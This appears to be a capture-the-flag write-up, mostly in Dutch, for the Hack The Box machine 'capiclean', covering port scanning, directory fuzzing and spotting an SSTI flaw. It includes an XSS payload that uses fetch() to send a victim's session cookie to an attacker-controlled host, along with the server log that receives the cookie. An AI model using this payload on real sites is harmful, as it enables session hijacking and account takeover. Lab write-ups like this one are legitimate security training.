# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB]
└─$ nmap 10.129.51.111             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 01:25 CET
Nmap scan report for 10.129.51.111
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB]
└─$ nmap -p22,80 -sCV 10.129.51.111
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 01:25 CET
Nmap scan report for 10.129.51.111
Host is up (0.017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik ben naar de webpagina gaan kijken en daar kan je zien de optie `Get a Quote`. Ik ben op die optie gaan klikken en als je daar de gegevens gaat invullen en zult gaan bekijken in burpsuite, zal je kunnen zien dat we een bericht verstuurd hebben.

```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
service=Carpet+Cleaning&service=Tile+%26+Grout&email=test%40t.htb
```

Wat als ik dit nu ga misbruiken voor het verkrijgen van een cookie session. Hiervoor zal ik gebruik gaan maken van het volgende commando. Als je de url wilt gaan encode kan je CTRL + U gebruiken. Dan krijg je het volgende als uitkomst.

```
service=<img+src%3dx+onerror%3dfetch("http%3a//10.10.16.68%3a8002/"%2bdocument.cookie)%3b>%26email%3dtest%2540mail.htb
```

Zoals je hieronder zult kunnen zien hebben we de cookie kunnen verkrijgen.

```
┌──(kali㉿kali)-[~/HTB]
└─$ python3 -m http.server 8002
Serving HTTP on 0.0.0.0 port 8002 (http://0.0.0.0:8002/) ...
10.129.51.111 - - [04/Nov/2025 03:30:17] code 404, message File not found
10.129.51.111 - - [04/Nov/2025 03:30:17] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.aQkJMw.SY_jKaTbnOl1RoU40CzkKwi3aMQ HTTP/1.1" 404 -
```

Ik ben de cookie gaan toevoegen aan de cookies in mijn webpagina en ben aan de hand van mijn ffuf commando gaan zien welke subdirectories er allemaal zijn.

```
┌──(kali㉿kali)-[~/HTB]
└─$ ffuf -u http://capiclean.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac

login                   [Status: 200, Size: 2106, Words: 297, Lines: 88, Duration: 68ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 71ms]
about                   [Status: 200, Size: 5267, Words: 1036, Lines: 130, Duration: 62ms]
services                [Status: 200, Size: 8592, Words: 2325, Lines: 193, Duration: 62ms]
dashboard               [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 64ms]
team                    [Status: 200, Size: 8109, Words: 2068, Lines: 183, Duration: 58ms]
quote                   [Status: 200, Size: 2237, Words: 98, Lines: 90, Duration: 61ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 17ms]
choose                  [Status: 200, Size: 6084, Words: 1373, Lines: 154, Duration: 116ms]
```

Ik ben een keer gaan proberen inloggen met een random user maar ik de session cookie niet gebruiken voor in te loggen. Dus ben ik eens gaan kijken of ik niet op het dashboard kon gaan en daar kon ik wel op connecteren.

![[Pasted image 20251103232418.png]]

Eens dat we op de dashboard zijn kunnen we eens gaan kijken naar de opties. Given the knowledge that this is a Python webserver, it's also likely a Flask webserver (based on the Server string). The templating language is likely Jinja2. Explore the sites looking for places where input is reflected back and processed as a template. Ik heb gezien dat Generate QR vulnerable is aan SSTI (Server Side Template Injection).

